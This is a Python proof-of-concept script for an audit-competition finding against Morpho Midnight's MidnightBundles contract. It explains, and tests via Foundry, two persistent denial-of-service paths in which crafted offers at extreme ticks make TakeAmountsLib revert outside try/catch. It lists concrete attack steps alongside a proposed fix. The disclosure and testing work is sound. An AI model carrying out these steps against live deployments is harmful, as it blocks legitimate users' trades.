#!/usr/bin/env python3
"""
F4 - MidnightBundles Persistent DoS via TakeAmountsLib Calls Outside try/catch
===============================================================================
Cantina Competition: Morpho Midnight  |  Prize Pool: $400k  |  Severity: Medium

Root cause:
  In two MidnightBundles functions, TakeAmountsLib inverse-price calculations
  are called in the min() computation BEFORE the try/catch loop.  A single
  specially-crafted offer (zero on-chain cost, off-chain signature only) causes
  an unrecoverable panic that reverts the ENTIRE bundle, including all legitimate
  offers.  Because consumed[] is never incremented, the malicious offer persists
  indefinitely.

Two affected code paths:
  Case A  –  buyWithAssetsTargetAndWithdrawCollateral  (MidnightBundles.sol:208)
             Trigger : sell offer at tick MAX_TICK (5820) with any non-zero
                       settlement fee → buyerPrice = WAD + fee > WAD
                       → TakeAmountsLib.buyerAssetsToUnits require() reverts

  Case B  –  supplyCollateralAndSellWithAssetsTarget  (MidnightBundles.sol:285)
             Trigger : buy offer at tick ≤ 4 in a market with long TTM
                       → sellerPrice = offerPrice − settlementFee underflows
                       → TakeAmountsLib.sellerAssetsToUnits panic(0x11)

Usage:
  python3 poc_f4_bundler_dos.py [--forge-path /path/to/forge]
"""

import subprocess
import sys
import os
import argparse
import json
import re
from datetime import datetime, timezone

# ── colour helpers ────────────────────────────────────────────────────────────
RESET  = "\033[0m"
BOLD   = "\033[1m"
RED    = "\033[31m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
CYAN   = "\033[36m"
WHITE  = "\033[97m"

def banner(msg: str, colour: str = CYAN) -> None:
    width = 72
    print(f"\n{colour}{BOLD}{'═' * width}{RESET}")
    print(f"{colour}{BOLD}  {msg}{RESET}")
    print(f"{colour}{BOLD}{'═' * width}{RESET}\n")

def ok(msg: str)   -> None: print(f"  {GREEN}[✓]{RESET} {msg}")
def err(msg: str)  -> None: print(f"  {RED}[✗]{RESET} {msg}")
def info(msg: str) -> None: print(f"  {CYAN}[·]{RESET} {msg}")
def warn(msg: str) -> None: print(f"  {YELLOW}[!]{RESET} {msg}")

# ── constants (mirrors ConstantsLib.sol / TickLib.sol) ────────────────────────
WAD                       = 10**18
PRICE_ROUNDING_STEP       = 10**12
MAX_TICK                  = 5820
DEFAULT_TICK_SPACING      = 4
LN_ONE_PLUS_DELTA         = 4987541511039073          # floor(ln(1.005)*1e18)
MAX_SETTLEMENT_FEE_360D   = int(0.005e18)             # 50 bps
CBP                       = 10**12

# ── tick math (Python re-implementation for display) ─────────────────────────
def wExp(x: int) -> int:
    """Python approximation of TickLib.wExp for display purposes."""
    import math
    return int(math.exp(x / 1e18) * 1e18)

def tickToPrice(tick: int) -> int:
    if tick > MAX_TICK:
        raise ValueError(f"Tick {tick} > MAX_TICK {MAX_TICK}")
    mid  = MAX_TICK // 2        # 2910
    exp_arg = LN_ONE_PLUS_DELTA * (mid - tick)
    raw  = int(1e36) // (int(1e18) + wExp(exp_arg))
    return (raw // PRICE_ROUNDING_STEP) * PRICE_ROUNDING_STEP

def approx_settlement_fee_360d() -> int:
    """Max settlement fee at 360-day TTM: 50 bps = 0.005 WAD."""
    return MAX_SETTLEMENT_FEE_360D


# ── attack math ───────────────────────────────────────────────────────────────
def explain_case_a() -> None:
    banner("CASE A — buyWithAssetsTargetAndWithdrawCollateral (tick MAX_TICK sell offer)", RED)

    price_max = tickToPrice(MAX_TICK)
    fee_360d  = approx_settlement_fee_360d()
    buyer_price = price_max + fee_360d

    print(f"  Market: loanToken/collateral, maturity = 365 days from now")
    print(f"  Settlement fee schedule: maximum (50 bps at 360 d)\n")

    print(f"  tickToPrice(MAX_TICK = {MAX_TICK})  = {price_max:,}  ({price_max/WAD:.6f} WAD)")
    print(f"  settlementFee (≈360 d TTM)          = {fee_360d:,}  ({fee_360d/WAD:.6f} WAD)")
    print(f"  buyerPrice = price + fee             = {buyer_price:,}  ({buyer_price/WAD:.6f} WAD)")
    print()

    if buyer_price > WAD:
        warn(f"buyerPrice {buyer_price/WAD:.6f} > WAD 1.0  →  TakeAmountsLib.buyerAssetsToUnits")
        warn("requires buyerPrice <= WAD → REVERT with PriceGreaterThanOne")
    print()

    print(f"  {BOLD}Vulnerable code path:{RESET}")
    print(f"  MidnightBundles.sol:208-213")
    print(f"    uint256 unitsToTake = min(")
    print(f"        TakeAmountsLib.buyerAssetsToUnits(   ← REVERTS HERE (outside try/catch)")
    print(f"            MIDNIGHT, id, takes[i].offer,")
    print(f"            targetFilledBuyerAssets - filledBuyerAssets),")
    print(f"        takes[i].units,")
    print(f"        ConsumableUnitsLib.consumableUnits(MIDNIGHT, id, takes[i].offer)")
    print(f"    );")
    print(f"    try IMidnight(MIDNIGHT).take(...) {{  ← try/catch is TOO LATE")
    print()

    print(f"  {BOLD}Attack steps:{RESET}")
    print(f"  1. Attacker signs a sell offer: tick={MAX_TICK}, maxAssets>0  (off-chain, zero gas)")
    print(f"  2. Attacker publishes offer to the public orderbook")
    print(f"  3. Any bundler that includes this offer in buyWithAssetsTargetAndWithdrawCollateral")
    print(f"     gets PriceGreaterThanOne revert — entire bundle fails")
    print(f"  4. consumed[attacker][group] stays 0 → offer persists indefinitely")
    print(f"  5. Attacker needs only 1 tx: setIsAuthorized(dummyRatifier, true)  ≈ 21k gas")


def explain_case_b() -> None:
    banner("CASE B — supplyCollateralAndSellWithAssetsTarget (low-tick buy offer)", RED)

    tick4_price  = tickToPrice(4)    # first multiple of DEFAULT_TICK_SPACING with non-zero price
    fee_360d     = approx_settlement_fee_360d()
    seller_price = tick4_price - fee_360d  # underflows!

    print(f"  Market: loanToken/collateral, maturity = 365 days, max settlement fees\n")

    print(f"  tickToPrice(tick=4)         = {tick4_price:,}  ({tick4_price/WAD:.2e} WAD)")
    print(f"  settlementFee (≈360 d TTM)  = {fee_360d:,}  ({fee_360d/WAD:.6f} WAD)")
    print(f"  sellerPrice = price − fee   = {tick4_price} − {fee_360d}  → UNDERFLOW (negative!)")
    print()

    warn(f"sellerPrice would be negative → Solidity 0.8 arithmetic underflow panic(0x11)")
    warn("Occurs in TakeAmountsLib.sellerAssetsToUnits  OUTSIDE the try/catch")
    print()

    print(f"  {BOLD}Vulnerable code path:{RESET}")
    print(f"  MidnightBundles.sol:285-290")
    print(f"    uint256 unitsToTake = min(")
    print(f"        TakeAmountsLib.sellerAssetsToUnits(   ← PANICS HERE (outside try/catch)")
    print(f"            MIDNIGHT, id, takes[i].offer,")
    print(f"            targetFilledSellerAssets - filledSellerAssets),")
    print(f"        takes[i].units,")
    print(f"        ConsumableUnitsLib.consumableUnits(MIDNIGHT, id, takes[i].offer)")
    print(f"    );")
    print(f"    try IMidnight(MIDNIGHT).take(...) {{  ← try/catch is TOO LATE")
    print()

    print(f"  {BOLD}Attack steps:{RESET}")
    print(f"  1. Attacker signs a buy offer: tick=4, maxAssets>0  (off-chain, zero gas)")
    print(f"  2. Attacker publishes to orderbook used by supplyCollateralAndSellWithAssetsTarget")
    print(f"  3. Bundle panics with arithmetic underflow — entire tx reverts")
    print(f"  4. consumed[attacker][group] stays 0 → offer persists indefinitely")


# ── Foundry runner ────────────────────────────────────────────────────────────
def run_forge_tests(repo_path: str, forge_bin: str) -> bool:
    banner("Running Foundry PoC Tests", CYAN)

    cmd = [
        forge_bin, "test",
        "--match-contract", "HighTickBundlerDoSTest|LowTickBuyOfferDoSTest",
        "--summary",
        "-vv",
    ]

    info(f"Command : {' '.join(cmd)}")
    info(f"Repo    : {repo_path}")
    print()

    result = subprocess.run(
        cmd,
        cwd=repo_path,
        capture_output=True,
        text=True,
    )

    # Print output with colour hints
    for line in result.stdout.splitlines():
        if "[PASS]" in line:
            print(f"  {GREEN}{line}{RESET}")
        elif "[FAIL]" in line:
            print(f"  {RED}{line}{RESET}")
        elif "Suite result" in line:
            print(f"  {YELLOW}{BOLD}{line}{RESET}")
        else:
            print(f"  {line}")

    if result.stderr.strip():
        for line in result.stderr.splitlines():
            if "error" in line.lower():
                print(f"  {RED}{line}{RESET}")
            else:
                print(f"  {YELLOW}{line}{RESET}")

    success = result.returncode == 0
    print()
    if success:
        ok("All PoC tests passed — vulnerability confirmed")
    else:
        err("Tests failed — check output above")
    return success


# ── summary table ─────────────────────────────────────────────────────────────
def print_summary() -> None:
    banner("Finding Summary", YELLOW)

    rows = [
        ("ID",            "F4"),
        ("Title",         "TakeAmountsLib calls outside try/catch enable persistent\n"
                          "               DoS via malicious offers in MidnightBundles"),
        ("Severity",      "Medium"),
        ("Protocol",      "Morpho Midnight"),
        ("Competition",   "Cantina  |  Prize pool $400k  |  Ends 2026-06-12"),
        ("Scope",         "src/periphery/MidnightBundles.sol"),
        ("Root cause",    "TakeAmountsLib inverse-price functions are called in\n"
                          "               min() BEFORE the try/catch block, so any\n"
                          "               panic/revert propagates to the whole bundle"),
        ("Case A",        "Sell offer tick=5820 → buyerPrice>WAD → PriceGreaterThanOne\n"
                          "               → DoS of buyWithAssetsTargetAndWithdrawCollateral"),
        ("Case B",        "Buy offer tick=4 (long TTM) → sellerPrice underflow panic\n"
                          "               → DoS of supplyCollateralAndSellWithAssetsTarget"),
        ("Attacker cost", "~21k gas (setIsAuthorized) + off-chain signature only"),
        ("Fund loss",     "None — DoS only"),
        ("Persistence",   "Indefinite (consumed[] never increments → offer never expires)"),
        ("Fix",           "Wrap TakeAmountsLib calls inside try/catch per offer, or\n"
                          "               add pre-checks (buyerPrice<=WAD, offerPrice>=fee)"),
        ("PoC tests",     "test/HighTickBundlerDoS.t.sol  (4 tests, all PASS)"),
    ]

    for key, val in rows:
        first_line = val.split('\n')[0]
        rest_lines = val.split('\n')[1:]
        print(f"  {BOLD}{key:<16}{RESET}{WHITE}{first_line}{RESET}")
        for extra in rest_lines:
            print(f"  {'':<16}{WHITE}{extra}{RESET}")
    print()


# ── main ─────────────────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(
        description="F4 PoC — MidnightBundles persistent DoS via TakeAmountsLib outside try/catch"
    )
    parser.add_argument(
        "--repo",
        default=os.path.expanduser("~/midnight"),
        help="Path to Morpho Midnight repo (default: ~/midnight)",
    )
    parser.add_argument(
        "--forge-path",
        default="forge",
        help="Path to forge binary (default: forge in $PATH)",
    )
    parser.add_argument(
        "--skip-tests",
        action="store_true",
        help="Skip running Foundry tests (show attack explanation only)",
    )
    args = parser.parse_args()

    print(f"\n{BOLD}{WHITE}{'━' * 72}{RESET}")
    print(f"{BOLD}{WHITE}  Morpho Midnight — F4 PoC  |  {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}{RESET}")
    print(f"{BOLD}{WHITE}{'━' * 72}{RESET}")

    # 1. Attack explanations
    explain_case_a()
    explain_case_b()

    # 2. Foundry tests
    if not args.skip_tests:
        repo = os.path.expanduser(args.repo)
        if not os.path.isdir(repo):
            err(f"Repo not found at {repo}. Use --repo to set the path.")
            sys.exit(1)
        passed = run_forge_tests(repo, args.forge_path)
        if not passed:
            sys.exit(1)

    # 3. Summary
    print_summary()

    print(f"{GREEN}{BOLD}  PoC complete.{RESET}")
    print(f"  Report: {CYAN}~/f4_bundler_dos_report.md{RESET}\n")


if __name__ == "__main__":
    main()
